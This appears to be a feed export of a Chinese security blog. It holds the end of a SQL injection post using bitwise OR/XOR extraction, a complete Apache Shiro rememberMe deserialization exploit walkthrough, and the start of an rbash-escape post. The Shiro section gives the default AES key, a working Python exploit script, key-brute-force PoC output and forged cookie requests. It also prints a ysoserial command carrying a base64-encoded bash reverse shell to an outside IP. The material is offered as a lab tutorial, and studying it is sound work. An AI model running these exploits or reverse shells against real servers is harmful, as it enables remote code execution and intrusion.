class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#int型按位或</span><br><span class="line">mysql&gt; insert into steady values (0 | (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from steady;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657374 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">#int型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ^ (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657338 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(100^74657338);</span><br><span class="line">+---------------------+</span><br><span class="line">| unhex(100^74657338) |</span><br><span class="line">+---------------------+</span><br><span class="line">| test                |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#字符型按位或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;0&#39;| (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657374 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#字符型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657338 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select unhex(&#39;100&#39;^74657338);</span><br><span class="line">+-----------------------+</span><br><span class="line">| unhex(&#39;100&#39;^74657338) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| test                  |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>mysql运算符</p><ul><li><p>按位或运算符–｜</p><p>0与任意的数字b或都为b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysql&gt; select (0|1);</span><br><span class="line">+-------+</span><br><span class="line">| (0|1) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|2323);</span><br><span class="line">+----------+</span><br><span class="line">| (0|2323) |</span><br><span class="line">+----------+</span><br><span class="line">|     2323 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0|452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或运算符–^</p><ul><li><p>0与任意的数字b异或都是b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (0^452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0^452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0^5644);</span><br><span class="line">+----------+</span><br><span class="line">| (0^5644) |</span><br><span class="line">+----------+</span><br><span class="line">|     5644 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>其他数字a与任意数字b异或得到c</p><p>可以通过c与a异或得到b，通常b是我们sql注入想要的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (10^5644);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5644) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5638 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (10^5638);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5638) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5644 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>1、mysql的网站注入，5.0以上和5.0以下有什么区别？</p><p>MySQL 5.0以上版本， 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p><p> 5.0以下是多用户单操作，5.0以上是多用户多操做。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h4&gt;&lt;p&gt;用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当</summary>
      
    
    
    
    <category term="SQL注入" scheme="http://s1eady.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>Shiro安全</title>
    <link href="http://s1eady.top/2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://s1eady.top/2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-03-27T05:32:30.000Z</published>
    <updated>2020-10-16T11:47:17.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro安全"><a href="#Shiro安全" class="headerlink" title="Shiro安全"></a>Shiro安全</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p><h2 id="Shiro的功能"><a href="#Shiro的功能" class="headerlink" title="Shiro的功能"></a>Shiro的功能</h2><ul><li>验证用户身份</li><li>用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限</li><li>在非 Web 或 EJB 容器的环境下可以任意使用Session API</li><li>可以响应认证、访问控制，或者 Session 生命周期中发生的事件</li><li>可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)</li><li>支持单点登录(SSO)功能</li><li>支持提供“Remember Me”服务，获取用户关联信息而无需登录</li></ul><h1 id="Apache-Shiro-反序列化漏洞实战"><a href="#Apache-Shiro-反序列化漏洞实战" class="headerlink" title="Apache Shiro 反序列化漏洞实战"></a>Apache Shiro 反序列化漏洞实战</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。实际上漏洞与shiro版本无关, 无论是否升级shiro到1.2.5及以上, 如果shiro的rememberMe功能的AES密钥被泄露, 就会导致反序列化漏洞。</p><h3 id="RememberMe"><a href="#RememberMe" class="headerlink" title="RememberMe"></a>RememberMe</h3><p>1、检索RememberMe cookie 的值<br>2、Base 64解码<br>3、使用AES解密(加密密钥硬编码)<br>4、进行反序列化操作（未作过滤处理）</p><p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p><p>用户登录凭证的生成，加密顺序：</p><p>Java序列化 —&gt; 使用密钥进行AES加密 —&gt; Base64加密 —&gt; 加密后的remember Me内容</p><p>在识别用户身份的时候，需要对remember Me的字段进行解密，解密的顺序为：</p><p> remember Me加密内容 —&gt; Base64解密 —&gt; 使用密钥进行AES解密 —&gt;Java反序列化。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于使用来aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。</p><p>1、AES加密是硬编码。</p><p>2、反序列化没有做任何过滤，外界传递什么值就反序列化什么值。</p><h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>如果登录页面有记住我的功能，登录页面的cookie中存在remeberMe=deleteMe的内容。</p><ul><li><p>使用burp测试</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/136A6698-B0F0-40A5-8222-A4778FDC93C6.png" alt="136A6698-B0F0-40A5-8222-A4778FDC93C6"></p><p>输入密码之后返回包中看到敏感字段</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200909161300847.png" alt="image-20200909161300847"></p></li><li><p>直接浏览器查看请求</p></li><li><p>fofa、shodan、zoomeye</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header&#x3D;&quot;rememberme&#x3D;deleteMe&quot;、header&#x3D;&quot;shiroCookie&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>ysoserial是一款目前最流行的Java反序列化Payload生成工具，目前支持29种的Payload生成。本地通过JRMPClient的payload链接服务器上的JRMP服务使用网上的漏洞利用工具发送即可利用成功。</p><h4 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h4><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><h4 id="RMI的序列化和反序列化"><a href="#RMI的序列化和反序列化" class="headerlink" title="RMI的序列化和反序列化"></a>RMI的序列化和反序列化</h4><p>在RMI的通信过程中，用到了很多的序列化和反序列化，而在Java中，只要进行反序列化操作就可能有漏洞。RMI通过序列化传输Remote对象，那么我们可以构造恶意的Remote对象，当服务端反序列化传输过来的数据时，就会触发反序列化。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://127.0.0.1:8080/doLogin&quot;</span></span><br><span class="line">jar_file = <span class="string">&#x27;/Users/apple/Documents/steady-sec/shiro/ysoserial.jar&#x27;</span></span><br><span class="line">cipher_key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 rememberme的值</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,jar_file, <span class="string">&quot;URLDNS&quot;</span>, <span class="string">&quot;http://95d950.dnslog.cn&quot;</span>],</span><br><span class="line">                        stdout=subprocess.PIPE)</span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</span><br><span class="line">file_body = pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送request</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>:base64_ciphertext.decode()&#125;, timeout=<span class="number">30</span>)</span><br><span class="line">    print(r.status_code)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    traceback.print_exc()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">95</span>d950.dnslog.cn<span class="number">112.25</span><span class="number">.12</span><span class="number">.136</span><span class="number">2020</span><span class="number">-10</span><span class="number">-10</span> <span class="number">10</span>:<span class="number">07</span>:<span class="number">12</span></span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>检查key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try CipherKey :5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;</span><br><span class="line">generator payload done.</span><br><span class="line">send payload ok.</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">try CipherKey :kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">generator payload done.</span><br><span class="line">send payload ok.</span><br><span class="line">checking.....</span><br><span class="line"></span><br><span class="line">vulnerable:True url:http:&#x2F;&#x2F;127.0.0.1:8080CipherKey:kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>检查gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 -t 3 -p &quot;ping -c 2 http:&#x2F;&#x2F;ax18gp.dnslog.cn&quot; -k &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>监听本地端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令。</p><p>Java base64编码<code>http://www.jackson-t.ca/runtime-exec-payloads.html</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure><p>CommonsCollections4、CommonsCollections2、CommonsCollections5都可以试试。</p><p>使用shiro.py 生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  shiro python shiro_poc_rember.py 127.0.0.1:6666</span><br><span class="line">rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;&#x2F;Users&#x2F;apple&#x2F;Documents&#x2F;steady-sec&#x2F;shiro&#x2F;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure><p>构造数据包，伪造cookie，发送Payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;doLogin HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 53</span><br><span class="line">Origin: http:&#x2F;&#x2F;127.0.0.1:8080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;login;jsessionid&#x3D;65E88136CDB707384CB4A4C27659B658</span><br><span class="line">Cookie: JSESSIONID&#x3D;65E88136CDB707384CB4A4C27659B658;rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&amp;password&#x3D;vulhub&amp;rememberme&#x3D;remember-me</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Shiro安全&quot;&gt;&lt;a href=&quot;#Shiro安全&quot; class=&quot;headerlink&quot; title=&quot;Shiro安全&quot;&gt;&lt;/a&gt;Shiro安全&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简</summary>
      
    
    
    
    <category term="组件安全" scheme="http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="组件安全" scheme="http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>rbash绕过</title>
    <link href="http://s1eady.top/2019/06/22/rbash%E7%BB%95%E8%BF%87/"/>
    <id>http://s1eady.top/2019/06/22/rbash%E7%BB%95%E8%BF%87/</id>
    <published>2019-06-22T01:20:56.000Z</published>
    <updated>2020-10-09T11:29:45.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Rbash绕过"><a href="#Rbash绕过" class="headerlink" title="Rbash绕过"></a>Rbash绕过</h1><h3 id="什么是受限shell环境"><a href="#什么是受限shell环境" class="headerlink" title="什么是受限shell环境?"></a>什么是受限shell环境?</h3><p>受限shell环境，指的是一个会阻止/限制某些命令（如cd、ls、echo等）或”阻止”SHELL、PATH、USER等环境变量的shell环境。有些时候，受限shell环境可能会阻止重定向输出操作符如&gt;，&gt;&gt;，或者其他使用这些重定向的命令。</p><h3 id="受限shell环境的目的"><a href="#受限shell环境的目的" class="headerlink" title="受限shell环境的目的"></a>受限shell环境的目的</h3><ul><li>提高安全性</li><li>防止受到黑客/渗透测试人员的攻击。</li><li>有时，系统管理员会创建一个受限shell环境，来防止受到某些危险命令误操作所带来的伤害。</li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>拿到一个受限制的shell之后，我们需要做的就是执行一些操作，来摸清当前shell的限制情况。</p><ul><li><p>查看是否可以执行某些命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd、ls、echo</span><br></pre></td></tr></table></figure></li><li><p>检查操作符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;、&gt;&gt;、&lt;、|</span><br></pre></td></tr></table></figure></li><li><p>检查编程语言是否可以运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl、ruby、python、php</span><br></pre></td></tr></table></figure></li><li><p>查看我们能以root用户运行那些命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo -l</span><br><span class="line">Password:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> apple on appledeMacBook-Pro:</span><br><span class="line">    env_reset, env_keep+=BLOCKSIZE, env_keep+=<span class="string">&quot;COLORFGBG COLORTERM&quot;</span>, env_keep+=__CF_USER_TEXT_ENCODING, env_keep+=<span class="string">&quot;CHARSET</span></span><br><span class="line"><span class="string">    LANG LANGUAGE LC_ALL LC_COLLATE LC_CTYPE&quot;</span>, env_keep+=<span class="string">&quot;LC_MESSAGES LC_MONETARY LC_NUMERIC LC_TIME&quot;</span>, env_keep+=<span class="string">&quot;LINES</span></span><br><span class="line"><span class="string">    COLUMNS&quot;</span>, env_keep+=LSCOLORS, env_keep+=SSH_AUTH_SOCK, env_keep+=TZ, env_keep+=<span class="string">&quot;DISPLAY XAUTHORIZATION XAUTHORITY&quot;</span>,</span><br><span class="line">    env_keep+=<span class="string">&quot;EDITOR VISUAL&quot;</span>, env_keep+=<span class="string">&quot;HOME MAIL&quot;</span>, lecture_file=/etc/sudo_lecture</span><br><span class="line"></span><br><span class="line">User apple may run the following commands on appledeMacBook-Pro:</span><br><span class="line">    (ALL) 